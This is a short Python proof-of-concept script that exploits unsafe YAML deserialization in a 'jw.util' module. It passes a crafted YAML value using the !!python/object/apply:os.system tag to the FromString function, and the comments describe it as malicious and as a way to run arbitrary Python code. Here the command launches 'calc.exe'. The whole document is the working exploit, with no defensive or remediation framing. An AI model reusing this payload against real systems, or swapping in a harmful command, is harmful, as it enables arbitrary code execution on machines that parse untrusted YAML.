# Import the jw.util module
import jw.util

# Define a malicious YAML configuration
# This configuration has a crafted value
# This value will execute arbitrary Python code
yaml_config = """
test: !!python/object/apply:os.system ['calc.exe']
"""

# Load the configuration with FromString
# This will trigger the vulnerability in the jw.util module
# The os.system function will launch the calculator application
jw.util.FromString(yaml_config)